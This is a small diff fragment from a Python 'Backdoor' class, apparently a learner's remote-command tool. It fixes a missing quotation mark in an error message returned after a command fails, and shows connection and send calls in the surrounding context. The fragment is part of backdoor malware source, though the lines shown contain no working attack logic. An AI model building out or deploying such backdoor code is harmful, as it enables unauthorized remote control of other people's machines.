@@ -63,7 +63,7 @@ class Backdoor:
                     #need to specify self since calling function from within class
                     #self.connection.send(command_result)
             except Exception: #catch any exception that might happen during above code; prob not good practice
-                command_result = [-] Error during command execution"
+                command_result = "[-] Error during command execution"
                 
             self.reliable_send(command_result)
 
